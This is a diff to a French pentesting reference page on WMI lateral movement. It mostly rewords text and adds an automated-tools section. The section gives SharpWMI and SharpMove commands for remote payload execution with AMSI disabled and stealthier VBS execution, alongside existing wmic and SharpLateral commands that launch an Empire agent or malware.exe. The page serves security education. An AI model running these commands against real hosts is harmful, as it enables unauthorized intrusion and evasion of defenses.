@@ -4,9 +4,9 @@
 
 ## Comment ça fonctionne
 
-Des processus peuvent être ouverts sur des hôtes où le nom d'utilisateur et soit le mot de passe soit le hash sont connus grâce à WMI. Les commandes sont exécutées en utilisant WMI par Wmiexec, offrant une expérience de shell semi-interactive.
+Des processus peuvent être ouverts sur des hôtes où le nom d'utilisateur et soit le mot de passe soit le hash sont connus grâce à l'utilisation de WMI. Les commandes sont exécutées en utilisant WMI par Wmiexec, offrant une expérience de shell semi-interactive.
 
-**dcomexec.py :** En utilisant différents points de terminaison DCOM, ce script offre un shell semi-interactif semblable à wmiexec.py, exploitant spécifiquement l'objet DCOM ShellBrowserWindow. Il prend actuellement en charge les objets Application MMC20, Shell Windows et Shell Browser Window. (source : [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py :** En utilisant différents points de terminaison DCOM, ce script offre un shell semi-interactif semblable à wmiexec.py, tirant spécifiquement parti de l'objet DCOM ShellBrowserWindow. Il prend actuellement en charge les objets Application MMC20, Shell Windows et Shell Browser Window. (source : [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## Fondamentaux de WMI
 
@@ -32,7 +32,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ### **Classes**
 
 Connaître le nom d'une classe WMI, comme win32_process, et l'espace de noms dans lequel elle se trouve est crucial pour toute opération WMI.  
-Commandes pour lister les classes commençant par `win32`:
+Commands to list classes beginning with `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
@@ -59,7 +59,7 @@ Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Descrip
 ```
 ## Énumération WMI
 
-### État du service WMI
+### Statut du service WMI
 
 Commandes pour vérifier si le service WMI est opérationnel :
 ```bash
@@ -91,15 +91,11 @@ Interroger à distance WMI pour des informations spécifiques, telles que les ad
 
 L'identification discrète des administrateurs locaux sur une machine distante et des utilisateurs connectés peut être réalisée grâce à des requêtes WMI spécifiques. `wmic` prend également en charge la lecture à partir d'un fichier texte pour exécuter des commandes sur plusieurs nœuds simultanément.
 
-Pour exécuter à distance un processus via WMI, comme le déploiement d'un agent Empire, la structure de commande suivante est utilisée, avec une exécution réussie indiquée par une valeur de retour de "0" :
+Pour exécuter un processus à distance via WMI, comme le déploiement d'un agent Empire, la structure de commande suivante est utilisée, avec une exécution réussie indiquée par une valeur de retour de "0" :
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Ce processus illustre la capacité de WMI pour l'exécution à distance et l'énumération des systèmes, mettant en évidence son utilité tant pour l'administration système que pour le pentesting.
-
-## Références
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+Ce processus illustre la capacité de WMI pour l'exécution à distance et l'énumération du système, mettant en évidence son utilité tant pour l'administration système que pour le pentesting.
 
 ## Outils Automatiques
 
@@ -107,4 +103,24 @@ Ce processus illustre la capacité de WMI pour l'exécution à distance et l'én
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Vous pouvez également utiliser **Impacket's `wmiexec`**.
+
+
+## Références
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
